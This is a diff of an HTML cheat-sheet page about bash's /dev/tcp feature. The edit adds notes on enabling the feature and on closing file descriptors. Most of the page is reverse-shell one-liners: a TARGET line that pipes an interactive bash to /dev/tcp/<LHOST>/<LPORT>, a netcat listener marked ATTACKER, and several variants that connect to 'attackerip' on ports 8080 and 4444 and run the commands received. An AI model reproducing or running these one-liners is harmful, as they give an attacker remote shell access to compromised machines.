@@ -3,7 +3,11 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>/dev/tcp</title>
-</head><body>TARGET: /bin/bash -i &gt; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&lt;&amp;1 2&gt;&amp;1<br/>
+</head><body>The ability to handle /dev/tcp/host/port and /dev/udp/host/port in redirection was added to bash in version 2.04. <br/>
+You need to compiled bash with --enable-net-redirections option.<br/>
+To test whether the feature is present, you can check the error message when trying to open a TCP port for the <a href="https://tools.ietf.org/html/rfc863">discard service</a>: both bash and ksh say “Connection refused” (or the command returns immediately if you have a discard service on your local machine), which you wouldn't see if this doesn't attempt to make some network connection.<br/>
+<br/>
+TARGET: /bin/bash -i &gt; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&lt;&amp;1 2&gt;&amp;1<br/>
 ATTACKER: nc -nvvlp &lt;LPORT&gt;<br/>
 <br/>
 /bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&amp;1 2&gt;&amp;1<br/>
@@ -11,7 +15,8 @@ ATTACKER: nc -nvvlp &lt;LPORT&gt;<br/>
 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196<br/>
 <br/>
 <br/>
-exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done <br/>
+exec 5&lt;&gt;/dev/tcp/attackerip/4444 <br/>
+cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done <br/>
 # or: <br/>
 while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done<br/>
 exec 5&lt;&gt;/dev/tcp/attackerip/4444<br/>
@@ -21,4 +26,10 @@ Read/send files?<br/>
 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done <br/>
 # or:<br/>
 while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done<br/>
-</body></html>
+<br/>
+<br/>
+<br/>
+<br/>
+Remember for close opened fd (exec)<br/>
+1: exec {file-descriptor}&gt;&amp;-<br/>
+2: exec {file-descriptor}&lt;&amp;-;</body></html>
